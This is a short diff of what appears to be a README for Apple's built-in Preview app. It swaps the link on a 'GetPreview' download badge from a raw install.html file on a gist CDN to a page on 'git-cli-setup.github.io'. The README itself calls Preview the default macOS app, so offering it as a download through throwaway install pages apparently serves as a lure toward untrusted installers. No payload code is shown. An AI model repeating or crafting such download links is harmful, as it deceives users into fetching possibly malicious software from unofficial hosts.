@@ -2,7 +2,7 @@
 
 Preview is the default macOS app for viewing images and PDFs, offering fast rendering, annotation tools, and convenient file management. It provides a seamless experience for users who need to view, edit, or organize their visual documents efficiently on macOS.
 
-<a href="https://gistcdn.githack.com/skpedanielrus439/f074b8d1a2f600e7ee9b2209d0076def/raw/a6b452d72af8215ff4bb36288bee7d07389ac4e0/install.html?offer=Preview" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Preview" target="_blank">
   <img 
     src="https://img.shields.io/badge/GetPreview%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
